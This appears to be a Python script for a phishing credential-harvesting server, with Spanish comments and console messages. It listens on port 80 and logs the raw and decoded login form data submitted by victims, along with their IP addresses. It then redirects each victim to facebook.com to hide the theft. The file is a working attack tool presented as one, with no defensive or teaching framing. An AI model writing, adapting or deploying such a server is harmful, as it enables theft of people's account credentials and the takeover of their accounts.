from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import time

HOST_NAME = "0.0.0.0"  
PORT_NUMBER = 80      

class PhishingHandler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        """Maneja las peticiones POST (cuando la víctima da clic en 'Iniciar Sesión')"""
        
        content_length = int(self.headers['Content-Length'])
        
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print("\n" + "="*40)
        print(f"[+] ¡VÍCTIMA CAYÓ! - {time.ctime()}")
        print(f"[+] IP de origen: {self.client_address[0]}")
        print("-" * 40)
        print("DATOS CRUDOS:")
        print(post_data)
        
        try:
            parsed_data = urllib.parse.parse_qs(post_data)
            print("-" * 40)
            print("CREDENCIALES DECODIFICADAS:")
            for key, value in parsed_data.items():
                print(f"{key}: {value[0]}")
        except:
            pass
        print("="*40 + "\n")

        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()

    def do_GET(self):
        """Maneja peticiones GET por si alguien entra directo a la IP"""
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()

if __name__ == '__main__':
    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), PhishingHandler)
    print(f"[*] Servidor de ataque iniciado en {HOST_NAME}:{PORT_NUMBER}")
    print("[*] Esperando credenciales... (Presiona Ctrl+C para detener)")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido.")
        httpd.server_close()